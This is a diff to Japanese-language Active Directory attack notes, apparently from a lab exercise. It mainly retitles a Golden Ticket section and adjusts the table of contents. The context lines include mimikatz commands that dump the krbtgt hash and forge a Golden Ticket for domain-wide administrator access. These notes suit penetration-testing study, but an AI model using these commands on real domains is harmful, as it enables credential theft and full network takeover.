@@ -11,6 +11,7 @@
 - [モジュール](#crackmapexec-モジュール)
 4. [Pass the ticket](#pass-the-ticket)
 5. [Golden Ticket](#golden-ticket)
+- [実行手順](#実行手順)
 
 ## impacket
 
@@ -166,7 +167,7 @@ privilege::debug
 lsadump::lsa /inject /name:krbtgt
 kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-849420856-2351964222-986696166 /krbtgt:
 ```
-### Golden Ticket 攻撃の実行手順
+### 攻撃の実行手順
 
 この手順は、WindowsのActive Directory環境でGolden Ticket攻撃を実行するためのものです。**Golden Ticket**攻撃により、Kerberosチケットを偽造して管理者権限を取得することができます。
 
@@ -203,7 +204,5 @@ kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-8494
 ```
 
 **注意:** `[KRBTGT_HASH]` は、上記の `lsadump::lsa` コマンドで取得した`krbtgt`アカウントのハッシュに置き換えてください。
-
----
 
 この手順により、攻撃者はドメイン全体に対して管理者権限を持つことができ、偽造されたKerberosチケットであらゆるコンピュータにアクセスできるようになります。
